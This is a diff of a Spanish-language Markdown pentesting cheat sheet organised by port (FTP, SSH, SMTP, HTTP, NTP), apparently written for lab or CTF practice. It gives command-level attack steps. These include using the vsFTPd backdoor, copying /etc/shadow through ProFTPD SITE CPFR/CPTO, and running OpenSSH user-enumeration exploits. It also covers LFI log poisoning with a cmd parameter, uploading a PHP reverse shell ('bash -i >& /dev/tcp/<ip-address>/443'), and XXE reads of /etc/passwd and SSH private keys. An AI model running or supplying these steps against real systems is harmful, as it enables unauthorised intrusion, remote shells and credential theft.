@@ -28,16 +28,16 @@ Debes especificar el protocolo seguido de la ip-address víctima. Posteriormente
  ftp <ip-address> -> username: anonymous
  		     password:
 ```	  
-Estos son algunos de los comandos que puedes utilizar una vez estes conectado al puerto ftp.<br>
+Estos son algunos de los comandos que puedes utilizar una vez estés conectado al puerto 21 de FTP.<br>
 - dir -> Ver los directorios compartidos.
 - ls -la -> Listar por archivos ocultos.
 - put <name_file> -> Verificar si se tiene capacidad de escritura y así modificar un archivo de la máquina.
   * Ej; put file | put /etc/passwd
 
 <br>  
-En caso de que se alla detectado la versión vsFTPd 2.3.44 al hacer el escaneo, debes buscar con la herramienta searchsploit un exploit que te permita explotar un backdoor que tiene esa versión, y así poder ejecutar comandos de forma remota (RCE) y enviarte una reverse shell para ganar acceso al sistema.
+En caso de que se haya detectado la versión vsFTPd 2.3.44 al hacer el escaneo, debes buscar con la herramienta searchsploit un exploit que te permita explotar un backdoor que tiene esa versión, y así poder ejecutar comandos de forma remota (RCE) y enviarte una reverse shell para ganar acceso al sistema.
 <br> 
-Con el comando `` searchsploit -x unix/remote/49757.py `` examinas el contenido del exploit para ver como se usa o si tienes que modificar algunos parametros.
+Con el comando `` searchsploit -x unix/remote/49757.py `` examinas el contenido del exploit para ver como se usa o si tienes que modíficar algunos parámetros.
 <br>
 Con el comando `` searchsploit -m unix/remote/49757.py `` copias el exploit a la ruta actual de trabajo.
 ```
@@ -64,7 +64,8 @@ CPFR <sp> pathname
 CPTO <sp> pathname
 ```
 <br>
-Para copiar un archivo que como ejemplo sería el archivo /etc/shadow a la ruta /home/\<username\>/share, que en este caso es donde se ha montado el recurso compartido "anonymous" y ademas tiene capacidad de lectura. Para replicar esto en otra máquina tendrías que ver la ruta donde está montado el recurso compartido.
+Para copiar un archivo que como ejemplo sería el archivo /etc/shadow a la ruta /home/\<username\>/share, que en este caso es donde se ha montado el recurso compartido "anonymous" y ademas tiene capacidad de lectura. Para replicar esto en otra máquina tendrías que ver la ruta donde está montado el recurso compartido.<br>
+Nota: Tambien puedes copiar los archivos en la ruta /var/www/html/ seguido del nombre del archivo con el cual lo vas a guardar, siempre y cuando tenga abierto el puerto 80 o 443.
 ```
 site cpfr /etc/shadow	                        
 # Es la ruta donde se situa el archivo que quieres copiar.
@@ -79,17 +80,40 @@ smbmap -H <ip-address> -r anonymous
 
 smbmap -H <ip-address> --download /anonymous/shadow
 ```
+
+
 <br><br>
 ## 22 SSH (Secure Shell).
-Protocolo usado para conectarse de forma remota a un servidor de forma segura.
-
-Existe un exploit que te ayuda a enumerar usuarios existentes en un servidor si la versión esta entre 2.3 < 7.7. 
-
-Solo se ejecuta el exploit con python y se le indica la ip-address víctima.
+Protocolo usado para conectarse de forma remota a un servidor de forma segura.<br>
+Existe un exploit que te ayuda a enumerar usuarios existentes en un servidor si la versión es inferior a 7.7.<br>
+Primero buscas un script que te permita explotar la vulnerabilidad con la herramienta searchsploit.
 ```
-searchsploit username enumeration -> OpenSSH 2.3 < 7.7 - Username Enumeration ----- linux/remote/45233.py
-python2 45233.py <ip-address>
+searchsploit ssh user enumeration
+------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                    |  Path
+------------------------------------------------------------------ ---------------------------------
+OpenSSH 2.3 < 7.7 - Username Enumeration                          | linux/remote/45233.py
+OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                    | linux/remote/45210.py
+OpenSSH 7.2p2 - Username Enumeration                              | linux/remote/40136.py
+OpenSSH < 7.7 - User Enumeration (2)                              | linux/remote/45939.py
+OpenSSHd 7.2p2 - Username Enumeration                             | linux/remote/40113.txt
+------------------------------------------------------------------ ---------------------------------
 ```
+
+Copias el script.py a la ruta actual para poder ejecutarlo.
+```
+searchsploit -m linux/remote/45939.py
+```
+
+Finalmente ejecutas el exploit con python indicando un usuario, seguido de la dirección IP de la máquina víctima.<br>
+- Uso: `` python2 45939.py <user> <ip-address> ``
+<br>
+<br>
+```
+python2 45939.py root 192.168.5.65
+```
+
+
 <br><br>
 ## 25 SMTP (Simple Mail Transfer Protocol).
 Protocolo de red de texto plano utilizado para enviar y recibir correos electrónicos lo que hace que las comunicaciones entre el cliente de correo y el servidor de correo puedan ser legibles para cualquier persona que interprete la comunicación. Para evitar esto se utilizan protocolos de cifrado como STARTTLS o DMARC.<br>
@@ -115,7 +139,7 @@ DATA			                      # Poner el comando DATA y luego dar enter para intr
 
 QUIT			                      # Cortar la conexión.
 ```
-Ya solo queda revisar los logs para veríficar que se haya guardado correctamente en la ruta /var/mail/<username>, mediante un LFI (Local File Inclution).<br>
+Ya solo queda revisar los logs para veríficar que se haya guardado correctamente en la ruta /var/mail/\<username\>, mediante un LFI (Local File Inclution).<br>
 Este sería un ejemplo desde consola usando el comando curl para tramitar la petición al sitio web y ver los logs.
 ```
 curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=whoami"
@@ -127,15 +151,17 @@ curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/c
 ```
 Para ver los logs desde el sitio web solo basta con poner la url donde se acontece el LFI seguido del parámetro cmd para inyectar los comandos.<br>
 http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/<username>&cmd=whoami
+
+
 <br><br>
-## 80 HTTP (Hypertext Transfer Protocol)
+## 80 HTTP (Hypertext Transfer Protocol).
 Protocolo usado para montar sitios web.
 Con la herramienta whatweb puedes ver informacion acerca del sitio web como que tipo de CMS "Control Management System" se esta usando ya sea joomla, wordpress o drupal, con que tipo de lenguaje esta programado (php, python, java etc). Tambien puedes ver esta información con wappalyzer que es un plugin que puedes instalar en tu navegador.
 ```
 whatweb http://<ip-addres>
 ```
 <br>
-Si hay un escaner de url en el sitio web, crea un archivo y ve si el contenido del archivo te lo muestra en la página al subirlo, prueba si te interpreta codigo php injectando un comando.
+Si hay un escaner de url en el sitio web, crea un archivo y ve si el contenido del archivo te lo muestra en la página al subirlo, prueba si te interpreta código php inyectando un comando.
 ```
 nvim test -> <?php system("whoami"); ?>
 http://<ip-addres>/test
@@ -148,20 +174,21 @@ http://127.0.0.1:443
 http://localhost:5000
 ```  
 <br>
-Si hay un campo para subir archivos probar subiendo un archivo.txt para verificar si se esta aplicando sanitización, en caso de que no se esta validando el tipo de archivo que se sube puedes subir un archivo.php malicioso para enviarte una reverse shell.
+Si hay un campo para subir archivos probar subiendo un archivo.txt para verificar si se está aplicando sanitización, en caso de que no se esté validando el tipo de archivo que se sube puedes subir un archivo.php malicioso para enviarte una reverse shell.
 ```
 nvim reverse_shell.php -> bash -c 'bash -i >& /dev/tcp/<ip-address>/443 0>&1'
 ```
-<br>
+<br><br>
+<b>XXE.</b><br>
 Si se aplica validación en archivos.xml se puede acontacer un XXE si el contenido del archivo.xml te lo muestra en la web tal cual. 
 
 Puedes leer el /etc/passwd para ver los usarios que hay en el sistema.
 
-Leer el /proc/net/fib_trie para verificar que no alla contenedores en la maquina víctima.
+Leer el /proc/net/fib_trie para verificar que no haya contenedores en la máquina víctima.
 
-Listar el /proc/net/tcp para ver los puertos que estan abiertos internamente en la maquina.
+Listar el /proc/net/tcp para ver los puertos que estan abiertos internamente en la máquina.
 
-Listar la id_rsa del usario para conectarse por ssh sin proporcionar contraseña (/home/<user>/.ssh/id_rsa).
+Listar la id_rsa del usario para conectarse por ssh sin proporcionar contraseña (/home/\<user\>/.ssh/id_rsa).
 ```
 <?xml version="1.0" encoding="ISO-8859-1"?>
           <!DOCTYPE foo [  
@@ -176,7 +203,7 @@ Listar la id_rsa del usario para conectarse por ssh sin proporcionar contraseña
 ```
 
 
-
+<br><br>
 ## UPD 123 NTP (Network Time Protocol)
 Protocolo utilizado para sincronizar el reloj de las maquinas conectadas. En ocasiones algunos ataques no suele funcionar sino esta sincronizada tu hora con la de la maquina víctima.
 
